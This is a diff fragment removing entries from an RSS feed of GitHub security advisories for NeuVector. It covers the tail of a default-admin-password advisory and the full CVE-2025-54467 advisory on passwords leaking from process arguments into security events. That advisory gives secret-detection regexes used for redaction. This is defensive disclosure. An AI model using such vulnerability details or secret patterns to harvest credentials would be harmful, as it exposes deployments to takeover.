-**NOTE:** If the default `admin` password is set using a Kubernetes ConfigMap or a persistent backup (not a fixed string), this value takes precedence over the Secret-based mechanism.
-
-### Workarounds
-
-For existing vulnerable versions, log in to the NeuVector UI immediately after deployment and update the default `admin` password.
-
-### References
-
-If you have any questions or comments about this advisory:
-
-- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.
-- Open an issue in the [NeuVector](https://github.com/neuvector/neuvector/issues/new/choose) repository.
-- Verify with our [support matrix](https://www.suse.com/suse-neuvector/support-matrix/all-supported-versions/neuvector-v-all-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/#suse-security).</description>
-      <guid isPermaLink="false">GHSA-8pxw-9c75-6w56</guid>
-      <category>CRITICAL</category>
-      <category>go:github.com/neuvector/neuvector</category>
-      <pubDate>Thu, 28 Aug 2025 13:33:36 +0000</pubDate>
-    </item>
-    <item>
-      <title>[MEDIUM] go:github.com/neuvector/neuvector — NeuVector process with sensitive arguments lead to leakage (CVE-2025-54467)</title>
-      <link>https://github.com/advisories/GHSA-w54x-xfxg-4gxq</link>
-      <description>CVE-2025-54467 · CVSS 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) · CWE-522, CWE-549
-
-Affected:
-- go/github.com/neuvector/neuvector &lt; 0.0.0-20250902144615-f9ddbdf42031 (patched: 0.0.0-20250902144615-f9ddbdf42031)
-
----
-
-### Impact
-
-When a Java command with password parameters is executed and terminated by NeuVector for Process rule violation. For example, 
-
-```
-java -cp /app ... Djavax.net.ssl.trustStorePassword=&lt;Password&gt;
-```
-
-The command with the password appears in the NeuVector security event. To prevent this, NeuVector uses the following default regular expression to detect and redact sensitive data from process commands:
-
-```
-(?i)(password|passwd|token)
-```
-
-Also, you can define custom patterns to redact by creating a Kubernetes ConfigMap. For example:
-
-```
-kubectl create configmap neuvector-custom-rules --from-file=secret-patterns.yaml -n neuvector
-```
-
-Sample `secret-patterns.yaml` content:
-
-```
-Pattern_list:
-  - (?i)(pawd|pword)
-  - (?i)(secret)
-```
-
-NeuVector uses the default and custom regex to decide whether the process command in a security event should be redacted.
-
-**Note:** If numerous regular expression (regex) patterns are configured in the Kubernetes ConfigMap for extended coverage of sensitive data matching, it can significantly impact performance of NeuVector enforcer, particularly in scenarios involving large inputs or frequent execution. The primary factor contributing to performance issues in regex is backtracking, where the regex engine attempts various matching paths when a pattern doesn't immediately find a match.
-
-### Patches
-
-This issue is fixed in NeuVector version **5.4.6** and later.
-
-### Workarounds
-
-There is no workaround. Upgrade to a patched version of NeuVector as soon as possible.
-
-### References
-
-If you have any questions or comments about this advisory:
-
-- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.
-- Open an issue in the [NeuVector](https://github.com/neuvector/neuvector/issues/new/choose) repository.
-- Verify with our [support matrix](https://www.suse.com/suse-neuvector/support-matrix/all-supported-versions/neuvector-v-all-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/#suse-security).</description>
-      <guid isPermaLink="false">GHSA-w54x-xfxg-4gxq</guid>
-      <category>MEDIUM</category>
-      <category>go:github.com/neuvector/neuvector</category>
-      <pubDate>Thu, 28 Aug 2025 13:33:23 +0000</pubDate>
     </item>
   </channel>
 </rss>
